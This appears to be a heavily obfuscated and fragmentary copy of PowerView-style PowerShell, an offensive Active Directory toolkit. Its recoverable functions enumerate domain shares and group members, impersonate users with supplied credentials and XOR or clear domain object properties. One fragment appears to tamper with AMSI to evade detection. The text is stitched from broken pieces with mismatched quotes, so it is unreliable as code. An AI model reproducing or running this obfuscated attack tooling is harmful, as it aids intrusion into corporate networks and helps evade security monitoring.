        YoV{UAcvIJKAlUIJKEs}.(Z3b{0}{1}Z3b-f S5zAS5z,S5zddS5z).Invoke((Z3b{2}{4}{1}{0}{3}Z3b -fS5zRS5z,S5zASSWOS5z,S5zDONT_S5z,S5zDS5z,S5zEXPIRE_PS5z), 65536)
        YoV{UaIJKcVIJKAlUes}.(Z3b{1}{0}Z3b-f S5zddS5z,S5zAS5z).Invoke((Z3b{3}{2}{1}{0}Z3b-fS5zTS5z,S5zUNS5z,S5zOS5z,S5zMNS_LOGON_ACCS5z), 131072)
        YoV{UACIJKVAluIJKes}.(Z3b{1}{0}Z3b-fS5zdS5z,S5zAdS5z).Invoke((Z3b{3}{2}{0}{1}Z3b-fS5zARTS5z,S5zCARD_REQUIREDS5z,S5zMS5z,S5zSS5z), 262144)
        YoV{UAcIJKVAlIJKUes}.(Z3b{1}{0}Z3b-fS5zddS5z,S5zAS5z).Invoke((Z3b{0}{4}{1}{2}{5}{3}Z3b -f S5zTRUSTS5z,S5zFS5z,S5zOS5z,S5z_DELEGATIONS5z,S5zED_S5z,S5zRS5z), 524288)
        YoV{UAcvIJKAlIJKUEs}.(Z3b{0}{1}Z3b-fS5zAdS5z,S5zdS5z).Invoke((Z3b{2}{1}{0}Z3b-fS5zT_DELEGATEDS5z,S5zOS5z,S5zNS5z), 1048576)
        YoV{uIJKAcvAluIJKes}.(Z3b{1}{0}Z3b-f S5zdS5z,S5zAdS5z).Invoke((Z3b{4}{0}{3}{2}{1}Z3b -f S5z_S5z,S5zNLYS5z,S5z_OS5z,S5zDES_KEYS5z,S5zUSES5z), 2097152)
        YoV{uacVIJKAIJKLUEs}.(Z3b{0}{1}Z3b-f S5zAS5z,S5zddS5z).Invoke((Z3b{3}{1}{2}{0}Z3b -fS5zPREAUTHS5z,S5zQS5z,S5z_S5z,S5zDONT_RES5z), 4194304)
        YoV{uIJKAIJKcvALIJKUes}.(Z3b{1}{0}Z3b-f S5zdS5z,S5zAdS5z).Invoke((Z3b{1}{0}{2}{3}Z3b-fS5zSWORD_EXPS5z,S5zPASS5z,S5zIRES5z,S5zDS5z), 8388608)
        YoV{UaCVIJKALIJKUIJKEs}.(Z3b{0}{1}Z3b-f S5zAdS5z,S5zdS5z).Invoke((Z3b{5}{0',' {
                &(Z3b{1}{5}{3}{0}{4}{2}Z3b -fS5zvS5z,S5zInvoS5z,S5zlfS5z,S5zReS5z,S5zertToSeS5z,S5zke-S5z)
            }
        }

        YoV{lOIJKGontOIJKkEN} = YoV{nuIJKlL}
        if (YoV{pSIJKBounIJKDPIJKARAmIJKeteRs}[(Z3b{1}{0}{2}Z3b-fS5zredeS5z,S5zCS5z,S5zntialS5z)]) {
            if (YoV{psIJKBOUnIJKdpaIJKRaIJKMETERS}[(Z3b{1}{0}Z3b-f S5zayS5z,S5zDelS5z)] -or YoV{psBoIJKUnDPARaMIJKeTIJKERS}[(Z3b{0}{1}{2}{3}{4}Z3b-f S5zSS5z,S5ztS5z,S5zoS5z,S5zpOnS5z,S5zSuccessS5z)]) {
                YoV{lOgIJKoNTIJKOkEN} = &(Z3b{4}{2}{3}{0}{1}Z3b-fS5zsonaS5z,S5ztionS5z,S5zseS5z,S5zrImperS5z,S5zInvoke-US5z) -Credential YoV{credenTIJKiIJKAL}
            }
            else {
                YoV{LOGoNIJKToIJKKen} = &(Z3b{1}{4}{2}{0}{3}Z3b -fS5zoS5z,S5zInvS5z,S5zpersonatiS5z,S5znS5z,S5zoke-UserImS5z) -Credential YoV{CredIJKeNtIJKiIJKAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (YoV{pSbOuNIJKDPArIJKAMeIJKTeRS}[(Z3b{0}{1}Z3b-f S5zDelaS5z,S5zyS5z)] -or YoV{PSBOundparIJKAmIJKeTeIJKRS}[(Z3b{2}{1}{0}Z3b -fS5zcessS5z,S5zcS5z,S5zStopOnSuS5z)]) {

            &(Z3b{3}{2}{1}{0}{4}Z3b -f S5zerbosS5z,S5z-VS5z,S5zeS5z,S5zWritS5z,S5zeS5z) Z3b[Find-InterestingDomainShareFile] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{3}{1}{2}{4}{0}Z3b-fS5zeS5z,S5zVS5z,S5zeS5z,S5zWrite-S5z,S5zrbosS5z) (S5z[Find-InterestinS5z+S5zgDoS5z+S5zmS5z+S5zaS5z+S5ziS5z+S5znShareFile]S5z+S5z S5z+S5zDeS5z+S5zlay: S5z+Z3bYoVDelay, Z3b+S5zJitS5z+S5zteS5z+S5zr: S5z+Z3bYoVJitterZ3b)
            YoV{CIJKOuIJKNtER} = 0
            YoV{rIJKANIJKdNO} = &(Z3b{3}{0}{1}{2}Z3b-f S5zOS5z,S5zbjS5z,S5zectS5z,S5zNew-S5z) (Z3b{3}{2}{1}{0}Z3b -fS5zdomS5z,S5zRanS5z,S5zstem.S5z,S5zSyS5z)

            ForEach (YoV{TaIJKRgIJKetIJKCOmIJKPuTeR} in YoV{TAIJKRIJKgetcoMpuIJKTers}) {
                YoV{COUIJKNIJKTer} = YoV{CIJKOUntIJKER} + 1

                
                &(Z3b{1}{3}{2}{0}Z3b-fS5zeepS5z,S5zStart-S5z,S5zlS5z,S5zSS5z) -Seconds YoV{RAnIJKdIJKNo}.(Z3b{0}{1}Z3b-fS5zNeS5z,S5zxtS5z).Invoke((1-YoV{jitTIJKEr})*YoV{delIJKAy}, (1+YoV{JIJKiTIJKTER})*YoV{DIJKeIJKlay})

                &(Z3b{1}{2}{0}Z3b-fS5zVerboseS5z,S5zWS5z,S5zrite-S5z) Z3b[Find-InterestingDomainShareFile] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                &(Z3b{3}{0}{1}{4}{2}Z3b-fS5zvoS5z,S5zke-CoS5z,S5zandS5z,S5zInS5z,S5zmmS5z) -ScriptBlock YoV{HIJKoStIJKEnUIJKmBlOck} -ArgumentList YoV{tARgeTIJKCOMIJKPIJKUIJKTeR}, YoV{IIJKNclIJKUDe}, YoV{ExIJKcLIJKUDEdsHaRIJKeS}, YoV{oFFIcIJKEdIJKoCS}, YoV{ExcIJKLUDIJKeHIJKIDden}, YoV{freIJKsHeIJKXes}, YoV{cheCkwIJKRITeIJKACCeIJKsS}, YoV{LOgIJKONIJKToken}
            }
        }
        else {
            &(Z3b{0}{1}{2}{3}Z3b -fS5zWrS5z,S5zite-VeS5z,S5zrbosS5z,S5zeS5z) (S5z[S5z+S5zFinS5z+S5zd-S5z+S5zInterS5z+S5zesS5z+S5ztingDomainShareS5z+S5zFile] S5z+S5zUsiS5z+S5zng S5z+S5zthS5z+S5zreaS5z+S5zdS5z+S5zing S5z+S5zwiS5z+S5zth S5z+S5zthrS5z+S5zeS5z+S5zads: S5z+Z3bYoVThreadsZ3b)

            
            YoV{scIJKRIPIJKTpAIJKRaMs} = @{
                (Z3b{0}{1}Z3b-fS5zInS5z,S5zcludeS5z) = YoV{iIJKNCLuIJKDe}
                (Z3b{1}{0}{3}{2}Z3b-fS5zludedShS5z,S5zExcS5z,S5zsS5z,S5zareS5z) = YoV{exIJKclIJKUDEdIJKsHAREs}
                (Z3b{0}{2}{1}{3}Z3b -f S5zOS5z,S5zceDocS5z,S5zffiS5z,S5zsS5z) = YoV{OfFiceIJKDoIJKcs}
                (Z3b{2}{3}{4}{1}{0}Z3b-f S5ziddenS5z,S5zeHS5z,S5zES5z,S5zxclS5z,S5zudS5z) = YoV{eXcLUdEhIIJKddIJKEn}
                (Z3b{1}{0}{2}Z3b-f S5zEXES5z,S5zFreshS5z,S5zsS5z) = YoV{fRIJKeIJKShIJKeXEs}
                (Z3b{2}{1}{0}Z3b -fS5zssS5z,S5zriteAcceS5z,S5zCheckWS5z) = YoV{CIJKHecKIJKwIJKRIIJKTeAIJKcCEss}
                (Z3b{3}{0}{1}{2}Z3b -f S5zenHS5z,S5zanS5z,S5zdleS5z,S5zTokS5z) = YoV{LoIJKgonIJKTIJKOken}
            }

            
            &(Z3b{0}{2}{5}{1}{4}{3}Z3b -fS5zNewS5z,S5zuS5z,S5z-ThreadeS5z,S5znS5z,S5znctioS5z,S5zdFS5z) -ComputerName YoV{tIJKAIJKRIJKgEtCOMPUteRs} -ScriptBlock YoV{HoSIJKTeIJKNUMIJKBlOck} -ScriptParameters YoV{SCIJKRIJKiPTPARAms} -Threads YoV{tIJKhREIJKADs}
        }
    }

    END {
        if (YoV{LoIJKGoNTOkIJKEn}) {
            &(Z3b{3}{0}{4}{','JKpUT} = &(Z3b{0}{2}{1}Z3b -','            if(YoV{psBOuNIJKdIJKPaIJKRaMIJKeTerS}[S5zXORS5z]) {
                try {
                    YoV{PsBoIJKUndIJKpIJKARAIJKmeTErs}[S5zXORS5z].(Z3b{2}{1}{0}Z3b -f S5zorS5z,S5zatS5z,S5zGetEnumerS5z).Invoke() JGO &(Z3b{4}{0}{2}{3}{1}Z3b-f S5zoS5z,S5zObjectS5z,S5zrEaS5z,S5zch-S5z,S5zFS5z) {
                        YoV{prIJKOIJKpIJKeRTIJKyNAme} = YoV{_}.Z3bNIJKAmeZ3b
                        YoV{pROPeRIJKTYxOIJKRVaIJKLuE} = YoV{_}.Z3bvIJKAlUEZ3b
                        &(Z3b{4}{2}{1}{0}{3}Z3b -fS5zeS5z,S5z-VS5z,S5ziteS5z,S5zrboseS5z,S5zWrS5z) Z3b[Set-DomainObject] XORing S5zYoVPropertyNameS5z with S5zYoVPropertyXorValueS5z for object S5zYoV(YoVRawObject.Properties.samaccountname)S5z Z3b
                        YoV{TIJKYpeIJKName} = YoV{EIJKNTRy}.YoV{prIJKOpIJKeRtYnAMe}[0].(Z3b{0}{1}Z3b -fS5zGeS5z,S5ztTypeS5z).Invoke().Z3bnaIJKmeZ3b

                        
                        YoV{PRoIJKpERtyVALIJKUe} = YoV(YoV{eIJKNIJKTRy}.YoV{pRoIJKPEIJKRtIJKynamE}) -bxor YoV{PrIJKopIJKerTyXoIJKRVaLue}
                        YoV{eIJKNIJKTRY}.YoV{PRIJKOpIJKeIJKRTyNaME} = YoV{PrIJKoPErtIJKYvAIJKLUe} -as YoV{TyPeNaIJKMe}
                    }
                    YoV{eIJKNtIJKRY}.(Z3b{0}{1}{2}Z3b -f S5zcommS5z,S5zitchangeS5z,S5zsS5z).Invoke()
                }
                catch {
                    &(Z3b{3}{2}{0}{1}Z3b-fS5znS5z,S5zgS5z,S5ze-WarniS5z,S5zWritS5z) Z3b[Set-DomainObject] Error XORS5zing properties for object S5zYoV(YoVRawObject.Properties.samaccountname)S5z : YoV_ Z3b
                }
            }
            if(YoV{PSBoundpArIJKAIJKMEteIJKRs}[(Z3b{0}{1}Z3b-f S5zCleS5z,S5zarS5z)]) {
                try {
                    YoV{PSIJKBoIJKUnDpArIJKAIJKMeTErs}[(Z3b{1}{0}Z3b-f S5zarS5z,S5zCleS5z)] JGO &(Z3b{0}{2}{3}{1}Z3b -f S5zFoS5z,S5zh-ObjectS5z,S5zrEaS5z,S5zcS5z) {
                        YoV{pRIJKOPEIJKRTYIJKNAmE} = YoV{_}
                        &(Z3b{0}{1}{2}Z3b -fS5zWriteS5z,S5z-VerS5z,S5zboseS5z) Z3b[Set-DomainObject] Clearing S5zYoVPropertyNameS5z for object S5zYoV(YoVRawObject.Properties.samaccountname)S5z Z3b
                        YoV{EntIJKRY}.YoV{pIJKROPeRtIJKyNIJKAMe}.(Z3b{0}{1}Z3b -f S5zcleS5z,S5zarS5z).Invoke()
                    }
                    YoV{EIJKNIJKTrY}.(Z3b{1}{0}{2}Z3b -f S5zitchaS5z,S5zcommS5z,S5zngesS5z).Invoke()
                }
                catch {
                    &(Z3b{1}{2}{0}{3}Z3b-f S5zrninS5z,S5zWritS5z,S5ze-WaS5z,S5zgS5z) Z3b[Set-DomainObject] Error clearing properties for object S5zY','{0}{1}Z3b-f S5zLimS5z,S5zitS5z,S5zmeS5z,S5zSS5z,S5zerverTiS5z)] = YoV{ServIJKerIJKTIIJKMELiIJKmiT} }
        if (YoV{psIJKBouNdIJKpaRamEIJKTeRS}[(Z3b{1}{0}{2}Z3b-f S5ztoS5z,S5zTombsS5z,S5zneS5z)]) { YoV{SeaIJKRchIJKeRaRGumENIJKTS}[(Z3b{0}{1}{2}Z3b-fS5zToS5z,S5zmbsS5z,S5ztoneS5z)] = YoV{TOIJKmbsIJKTOIJKNe} }
        if (YoV{psBoIJKUNDPArIJKAmetIJKErs}[(Z3b{0}{2}{1}Z3b-f S5zCredS5z,S5zlS5z,S5zentiaS5z)]) { YoV{seARcIJKHErAIJKRGUIJKMIJKeNtS}[(Z3b{1}{0}{2}Z3b -fS5zdentiaS5z,S5zCreS5z,S5zlS5z)] = YoV{cIJKReIJKdIJKeNtIAl} }

        YoV{AdNAMIJKearguMIJKents} = @{}
        if (YoV{pSBIJKoIJKUNdpIJKARaIJKmETErs}[(Z3b{2}{0}{1}Z3b -fS5ziS5z,S5znS5z,S5zDomaS5z)]) { YoV{adIJKNAIJKmeARGuMIJKENTS}[(Z3b{1}{0}Z3b-f S5znS5z,S5zDomaiS5z)] = YoV{doIJKMAiN} }
        if (YoV{PIJKSboUNdpIJKArameIJKTEIJKRs}[(Z3b{0}{2}{1}Z3b -f S5zSS5z,S5zrS5z,S5zerveS5z)]) { YoV{adNaMeaIJKRIJKGUIJKMIJKENts}[(Z3b{1}{0}Z3b-f S5zrS5z,S5zServeS5z)] = YoV{SIJKerver} }
        if (YoV{pSBIJKoUNdPArAMIJKetIJKERs}[(Z3b{2}{1}{0}Z3b-fS5zialS5z,S5zredentS5z,S5zCS5z)]) { YoV{aDnIJKAMIJKEaRgIJKUIJKmENTs}[(Z3b{1}{0}{2}Z3b-fS5zaS5z,S5zCredentiS5z,S5zlS5z)] = YoV{cIJKReIJKDEnTIAl} }
    }

    PROCESS {
        YoV{GRIJKoUpSIJKEARCIJKhIJKeR} = &(Z3b{1}{2}{0}{5}{3}{4}Z3b-fS5znSearS5z,S5zGet-DS5z,S5zomaiS5z,S5zhS5z,S5zerS5z,S5zcS5z) @SearcherArguments
        if (YoV{gIJKROupsEarIJKCHIJKEr}) {
            if (YoV{pSBoUNdPIJKArIJKAMEtIJKeRs}[(Z3b{1}{2}{0}{4}{3}Z3b-f S5zhinS5z,S5zRecurseUsingMatS5z,S5zcS5z,S5zleS5z,S5zgRuS5z)]) {
                YoV{sEAIJKRcHIJKEIJKRarIJKguIJKMents}[(Z3b{0}{1}{2}Z3b -fS5zIS5z,S5zdentiS5z,S5ztyS5z)] = YoV{iDIJKEnIJKTIJKIty}
                YoV{SIJKeaRIJKCIJKHeIJKRIJKArGuMENts}[S5zRawS5z] = YoV{TRIJKUe}
                YoV{GrIJKoup} = &(Z3b{2}{3}{0}{1}Z3b -fS5zuS5z,S5zpS5z,S5zGet-DomainGrS5z,S5zoS5z) @SearcherArguments

                if (-not YoV{GroIJKUp}) {
                    &(Z3b{3}{1}{0}{2}Z3b-f S5zWarniS5z,S5z-S5z,S5zngS5z,S5zWriteS5z) (S5z[Get-DS5z+S5zomaiS5z+S5znGS5z+S5zroupMember]S5z+S5z S5z+S5zErS5z+S5zror S5z+S5zsearS5z+S5zchiS5z+S5zngS5z+S5z S5z+S5zforS5z+S5z S5z+S5zgroS5z+S5zup S5z+S5zwitS5z+S5zh S5z+S5ziS5z+S5zdentiS5z+S5zty:S5z+S5z S5z+Z3bYoVIdentityZ3b)
                }
                else {
                    YoV{GrOuPfoIJKUNdNIJKAme} = YoV{GIJKRoUp}.Z3bpIJKRoPeIJKRtIEsZ3b.(Z3b{0}{1}Z3b -fS5zitS5z,S5zemS5z).Invoke((Z3b{4}{2}{1}{3}{0}Z3b-fS5ztnameS5z,S5zacS5z,S5zmS5z,S5zcounS5z,S5zsaS5z))[0]
                    YoV{GIJKRoupIJKFoUIJKNddN} = YoV{GrIJKOIJKUP}.Z3bPRIJKoPErTIJKiesZ3b.(Z3b{1}{0}Z3b-fS5zmS5z,S5ziteS5z).Invoke((Z3b{1}{2}{5}{4}{3}{0}Z3b-fS5zmeS5z,S5zdS5z,S5ziS5z,S5zhednaS5z,S5zuisS5z,S5zstingS5z))[0]

                    if (YoV{psIJKBOUIJKNdParamIJKEIJKTERs}[(Z3b{0}{1}Z3b-fS5zDomS5z,S5zainS5z)]) {
                        YoV{grIJKOuIJKpIJKFOUnIJKddomAIJKin} = YoV{dOMIJKAin}
                    }
                    else {
                        
                        if (','guidS5z,S5zoS5z),(Z3b{0}{1}{2}Z3b -fS5zobS5z,S5zjectsiS5z,S5zdS5z),(Z3b{1}{2}{0}{3}Z3b -f ',',S5zameS5z)]) {
            YoV{GROIJKUP}.Z3bnIJKAMeZ3b = YoV{nAIJKmE}
        }
        else {
            YoV{gRIJKoIJKUP}.Z3bNAIJKmEZ3b = Yo','     YoV{rAIJKNDno} = &(Z3b{0}{2}{1}Z3b-fS5zNS5z,S5zObjectS5z,S','5zGS5z,S5zet-DatS5z,S5zeS5z)).(Z3b{0}{2}{1}Z3b-f S5zAS5z,S5zDaysS5z,S5zddS5z).Invoke(-7).(Z3b{1}{0}{2}Z3b-fS5zoStrinS5z,S5zTS5z,S5zgS5z).Invoke((Z3b{0}{1}{2}Z3b -f S5zMM/dS5z,S5zd/yS5z,S5zyyyS5z))
            YoV{sIJKeIJKAIJKRcheIJKRARGumeNIJKTS}[(Z3b{0}{1}Z3b -f S5zInclS5z,S5zudeS5z)] = @((Z3b{0}{1}Z3b-fS5z*.exS5z,S5zeS5z))
        }
        YoV{sEAIJKRIJKCHeIJKRaIJKRGuMentS}[(Z3b{0}{1}Z3b-fS5zForcS5z,S5zeS5z)] = -not YoV{PsboUndpAIJKRaIJKmIJKEtErs}[(Z3b{2}{1}{0}Z3b-fS5zHiddenS5z,S5zcludeS5z,S5zExS5z)]

        YoV{MApPeDCIJKOIJKMputIJKErs} = @{}

        function TEST-IJKWriIJKTe {
            
            [CmdletBinding()]Param([String]YoV{paIJKTh})
            try {
                YoV{fIlIJKETEIJKst} =  (  &(Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zChIlDITS5z,S5zMS5z) Variable:L4J9  ).Z3bVIJKAluEZ3b::(Z3b{0}{2}{1}Z3b -fS5zOpS5z,S5zteS5z,S5zenWriS5z).Invoke(YoV{PAIJKTH})
                YoV{FilIJKETeIJKst}.(Z3b{0}{1}Z3b -fS5zCloS5','b{9}{1}{2}{16}{12}{6}{0}{15}{8}{7}{14}{3}{10}{11}{13}{4}{5}Z3b -F S5z.AUS5z,S5zystS5z,S5zEM.ManS5z,S5zIS5z,S5zIONSS5z,S5zTatES5z,S5zeMENtS5z,S5z.ruNS5z,S5zIoNS5z,S5zsS5z,S5zNiTS5z,S5ziAS5z,S5zGS5z,S5zlSEssS5z,S5zSPaCES.S5z,S5ztOmaTS5z,S5zaS5z) ) ;  &(Z3b{1}{0}{2}Z3b -fS5zvarIS5z,S5zseT-S5z,S5zaBleS5z)  (Z3buxZ3b+Z3b2eZ3b) ([tYPE](Z3b{5}{6}{4}{7}{2}{1}{0}{3}Z3b-FS5zNS5z,S5zaRTMES5z,S5zg.apS5z,S5zTStAteS5z,S5zTHReS5z,S5zSySS5z,S5zTEM.S5z,S5zadINS5z) )  ;  &(Z3b{1}{0}Z3b -fS5zEmS5z,S5zSET-ItS5z) vArIaBLe:R26V3d ([Ty','oS5z)

            
            YoV{jIJKobs} += @{
                (S5zPSS5z) = YoV{PoweRsIJKHEIJKLL}
                (Z3b{1}{0}Z3b -fS5zutputS5z,S5zOS5z) = YoV{outIJKpIJKUT}
                (Z3b{0}{1}Z3b-f S5zResuS5z,S5zltS5z) = YoV{mEtIJKHOD}.Z3bIIJKNvOkeZ3b(YoV{pIJKowIJKeIJKRSHeLl}, @(YoV{nIJKULL}, [Management.Automation.PSDataCollection[Object]]YoV{OuIJKTpuT}))
            }
        }
    }

    END {
        &(Z3b{1}{0}{2}Z3b -fS5zriteS5z,S5zWS5z,S5z-VerboseS5z) (Z3b{8}{2}{5}{10}{0}{3}{11}{1}{9}{6}{4}{7}Z3b -f S5zadS5z,S5zn]S5z,S5zNewS5z,S5zedFS5z,S5zs eS5z,S5z-S5z,S5zadS5z,S5zxecutingS5z,S5z[S5z,S5z ThreS5z,S5zThreS5z,S5zunctioS5z)

        
        Do {
            ForEach (YoV{jIJKoB} in YoV{joIJKBs}) {
                YoV{JIJKoB}.Z3boutIJKpuTZ3b.(Z3b{2}{1}{0}Z3b -f S5zAllS5z,S5zdS5z,S5zReaS5z).Invoke()
            }
            &(Z3b{3}{0}{1}{2}Z3b-f S5ztart-SS5z,S5zleeS5z,S5zpS5z,S5zSS5z) -Seconds 1
        }
        While ((YoV{jIJKObs} JGO &(Z3b{2}{0}{1}Z3b-fS5zhere-S5z,S5zObjectS5z,S5zWS5z) { -not YoV{_}.Z3bReIJKsULtZ3b.Z3bIIJKScIJKOIJKMpLeTedZ3b }).Z3bcoIJKUntZ3b -gt 0)

        YoV{sLIJKeePsEIJKCoNDs} = 100
        &(Z3b{2}{3}{0}{1}Z3b-f S5zeS5z,S5zrboseS5z,S5zWriteS5z,S5z-VS5z) (S5z[S5z+S5zNewS5z+S5z-ThreaS5z+S5zdedFunctioS5z+S5znS5z+S5z]S5z+S5z S5z+S5zWaitiS5z+S5zngS5z+S5z S5z+Z3bYoVSleepSeconds Z3b+S5zseS5z+S5zcoS5z+S5znds S5z+S5zfS5z+S5zor S5z+S5zfinaS5z+S5zl S5z+S5zcS5z+S5zleanS5z+S5zuS5z+S5zp...S5z)

        
        for (YoV{I}=0; YoV{i} -lt YoV{sLEeIJKpIJKSECoIJKNds}; YoV{I}++) {
            ForEach (YoV{JIJKOB} in YoV{jOIJKBS}) {
                YoV{JIJKOB}.Z3bOutPIJKUtZ3b.(Z3b{2}{1}{0}Z3b-fS5zlS5z,S5zadAlS5z,S5zReS5z).Invoke()
                YoV{jIJKoB}.Z3bpsZ3b.(Z3b{0}{2}{1}Z3b -fS5zDispS5z,S5zeS5z,S5zosS5z).Invoke()
            }
            &(Z3b{1}{3}{2}{0}Z3b -fS5zpS5z,S5zStS5z,S5zt-SleeS5z,S5zarS5z) -S 1
        }

        YoV{poIJKOl}.(Z3b{1}{0}{2}Z3b-f S5zsposS5z,S5zDiS5z,S5zeS5z).Invoke()
        &(Z3b{2}{0}{1}{3}Z3b -f S5zriteS5z,S5z-S5z,S5zWS5z,S5zVerboseS5z) (Z3b{2}{11}{1}{8}{9}{7}{6}{0}{4}{5}{3}{10}Z3b-fS5z cS5z,S5z-S5z,S5z[NS5z,S5zetS5z,S5zompS5z,S5zlS5z,S5zll threadsS5z,S5zction] aS5z,S5zThread','5zgivenS5z,S5zmeS5z),(Z3b{3}{2}{0}{1}Z3b -f S5ztS5z,S5zancetypeS5z,S5znsS5z,S5ziS5z),(Z3b{4}{1}{3}{2}{0}Z3b -fS5zjectS5z,S5zyS5z,S5ztemobS5z,S5zsS5z,S5ziscriticalsS5z),(Z3b{0}{3}{1}{2}Z3b-fS5zlaS5z,S5zlogofS5z,S5zfS5z,S5zstS5z),(Z3b{3}{2}{1}{0}Z3b -fS5znS5z,S5zogoS5z,S5ztlS5z,S5zlasS5z),(Z3b{2}{3}{1}{0}Z3b-fS5zmpS5z,S5zmestaS5z,S5zlastlogontS5z,S5ziS5z),(Z3b{1}{2}{0}Z3b-f S5ztimeS5z,S5zloS5z,S5zckoutS5z),(Z3b{2}{0}{1}Z3b-f S5zgoncoS5z,S5zuntS5z,S5zloS5z),(Z3b{2}{1}{0}Z3b -f S5zrofS5z,S5zbeS5z,S5zmemS5z),(Z3b{3}{2}{4}{0}{5}{1}Z3b -fS5zcryptS5z,S5zontypesS5z,S5zsS5z,S5zmsds-S5z,S5zupportedenS5z,S5ziS5z),(Z3b{1}{0}Z3b-f S5zmeS5z,S5znaS5z),(Z3b{0}{1}{2}Z3b-f S5zobjS5z,S5zecS5z,S5ztcategoryS5z),(Z3b{2}{1}{0}Z3b -fS5zassS5z,S5zjectclS5z,S5zobS5z),(Z3b{1}{0}{2}Z3b-f S5ztguiS5z,S5zobjecS5z,S5zdS5z),(Z3b{3}{2}{0}{1}Z3b-fS5zectsS5z,S5zidS5z,S5zbjS5z,S5zoS5z),(Z3b{2}{3}{0}{1}Z3b -f S5zoupiS5z,S5zdS5z,S5zpS5z,S5zrimarygrS5z),(Z3b{2}{1}{3}{0}Z3b -f S5zsetS5z,S5zdlaS5z,S5zpwS5z,S5zstS5z),(Z3b{1}{0}{3}{2}Z3b-fS5znS5z,S5zsamaccouS5z,S5zameS5z,S5ztnS5z),(Z3b{3}{0}{1}{2}Z3b -f S5zmS5z,S5zaccounS5z,S5zttypeS5z,S5zsaS5z),S5zsnS5z,(Z3b{4}{5}{3}{0}{1}{2}Z3b-f S5zccounS5z,S5ztcS5z,S5zontrolS5z,S5zaS5z,S5zusS5z,S5zerS5z),(Z3b{3}{1}{0}{2}{4}Z3b -fS5zncipS5z,S5zriS5z,S5zalnamS5z,S5zuserpS5z,S5zeS5z),(Z3b{2}{1}{0}Z3b-f S5zgedS5z,S5znchanS5z,S5zusS5z),(Z3b{1}{0}{2}{3}Z3b-f S5zsncS5z,S5zuS5z,S5zrS5z,S5zeatedS5z),(Z3b{2}{1}{3}{0}Z3b -f S5zdS5z,S5znchS5z,S5zwheS5z,S5zangeS5z),(Z3b{1}{2}{0}Z3b -fS5ztedS5z,S5zwhenS5z,S5zcreaS5z))

        YoV{GRoUpRIJKeFERENCePIJKRopEIJKRtYIJKseT} = @((Z3b{2}{0}{1}Z3b -fS5zcounS5z,S5ztS5z,S5zadminS5z),S5zcnS5z,(Z3b{0}{1}{2}Z3b -fS5zdescS5z,S5zriptiS5z,S5zonS5z),(Z3b{2}{0}{1}{3}Z3b -f S5znaS5z,S5zmS5z,S5zdistinguishedS5z,S5zeS5z),(Z3b{0}{3}{4}{2}{1}Z3b-fS5zdscoreS5z,S5zdataS5z,S5zonS5z,S5zproS5z,S5zpagatiS5z),(Z3b{0}{1}{3}{2}Z3b -fS5zgrouptS5z,S5zyS5z,S5zeS5z,S5zpS5z),(Z3b{1}{0}{2}{3}Z3b -f S5znstancS5z,S5ziS5z,S5zetS5z,S5zypeS5z),(Z3b{6}{0}{1}{4}{3}{5}{2}Z3b -f S5zticalsS5z,S5zysteS5z,S5ztS5z,S5zeS5z,S5zmobjS5z,S5zcS5z,S5ziscriS5z),(Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zmS5z,S5zmberS5z),(Z3b{0}{1}{2}Z3b-fS5zmS5z,S5zembeS5z,S','IJKIshIJKEd} = YoV{TrIJKUE}
                            }
                        }
                    }
                    else {
                        YoV{grOuPfouIJKNDIJKNAME} = YoV{rEIJKSULt}.Z3bPRIJKoIJKPIJKERtIEsZ3b.(Z3b{0}{1}Z3b-fS5ziteS5z,S5zmS5z).Invoke((Z3b{1}{2}{0}{3}Z3b -fS5zccounS5z,S5zsS5z,S5zamaS5z,S5ztnameS5z))[0]
                        YoV{GrOUIJKpFOIJKUNIJKDIJKDN} = YoV{reSUIJKlT}.Z3bprOpIJKEIJKRtIJKIEsZ3b.(Z3b{1}{0}Z3b -f S5zemS5z,S5zitS5z).Invoke((Z3b{4}{0}{3}{1}{2}Z3b-fS5znguS5z,S5zshednamS5z,S5zeS5z,S5ziS5z,S5zdistiS5z))[0]
                        YoV{MIJKeMbeIJKRS} += YoV{rIJKEsULt}.Z3bPIJKROPEIJKRtieSZ3b.(Z3b{0}{1}Z3b-f S5ziteS5z,S5zmS5z).Invoke(YoV{RaNIJKGIJKEDIJKpropErty})
                    }

                    if (YoV{pIJKsBoundPIJKAramEtEIJKRS}[(Z3b{0}{1}{2}Z3b -f S5zDomS5z,S5zaS5z,S5zinS5z)]) {
                        YoV{GRIJKOIJKUIJKpFoUNdDoIJKmaIJKIn} = YoV{domIJKAIJKIn}
                    }
                    else {
                        
                        if (YoV{GIJKROIJKUPFOUnDIJKdn}) {
                            YoV{GrIJKOUIJKpfouIJKNDdoMAIN} = YoV{GRoUpFOIJKUNDIJKDn}.(Z3b{1}{0}{2}Z3b-f S5zStriS5z,S5zSubS5z,S5zngS5z).Invoke(YoV{gIJKROUpfIJKoUndIJKdn}.(Z3b{1}{0}Z3b-fS5zOfS5z,S5zIndexS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        }
                    }
                }
            }

            ForEach (YoV{MEIJKMber} in YoV{MemIJKBeIJKRs}) {
                if (YoV{RecuIJKRSE} -and YoV{UseMIJKATChIIJKNGrIJKULe}) {
                    YoV{PIJKRIJKOPeIJKRtIEs} = YoV{_}.Z3bPROpERIJKTIJKiESZ3b
                }
                else {
                    YoV{OIJKBjEIJKCTIJKseIJKAIJKRCIJKheRARGUMENIJKTS} = YoV{SeaIJKRChEIJKRaIJKRIJKgUIJKmENts}.(Z3b{0}{1}Z3b -f S5zCS5z,S5zloneS5z).Invoke()
                    YoV{objIJKEIJKCTSeaRCHeIJKRaIJKRgIJKUmIJKEIJKNts}[(Z3b{0}{2}{1}Z3b-f S5zIdeS5z,S5zityS5z,S5zntS5z)] = YoV{MeMIJKBIJKER}
                    YoV{obJECIJKTseAIJKRCHIJKeRARGuMIJKenIJKTs}[S5zRawS5z] = YoV{tIJKRue}
